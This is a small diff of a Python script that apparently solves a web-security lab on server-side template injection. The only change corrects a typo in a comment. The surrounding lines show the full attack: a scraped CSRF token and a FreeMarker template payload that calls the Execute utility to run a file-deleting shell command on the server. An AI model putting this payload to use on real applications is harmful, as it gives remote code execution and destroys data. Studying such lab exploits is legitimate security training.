@@ -39,7 +39,7 @@ token = soup.find('input', {'name': 'csrf'})['value'] #template change csrf toke
 # Template framework is apache Freemarker. There is an execute class we can use to run code
 # As detailed here in the documentation: https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html
 
-# Post our malicous payload
+# Post our malicious payload
 data = { 'csrf': token,
         'template' : '${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}',
         'template-action' : "save"
